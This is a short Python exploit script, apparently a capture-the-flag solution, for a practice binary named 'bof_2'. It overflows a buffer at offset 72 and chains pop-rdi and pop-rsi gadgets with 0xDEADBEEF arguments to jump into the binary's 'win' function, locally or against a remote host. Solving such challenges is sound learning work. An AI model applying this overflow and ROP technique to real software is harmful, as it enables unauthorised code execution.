#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./bof_2', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''


        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    offset = 72
    pop_rdi = 0x00000000004011e5
    pop_rsi = 0x00000000004011ee

    pl = flat({

        offset : [

            pop_rdi + 1, # ret;
            pop_rdi,
            0xDEADBEEFDEADBEEF,
            pop_rsi,
            0xDEADBEEFDEADBEEF,
            exe.sym['win']

        ]

    })

    sla(b'number: ', pl)

    interactive()

if __name__ == '__main__':
  exploit()
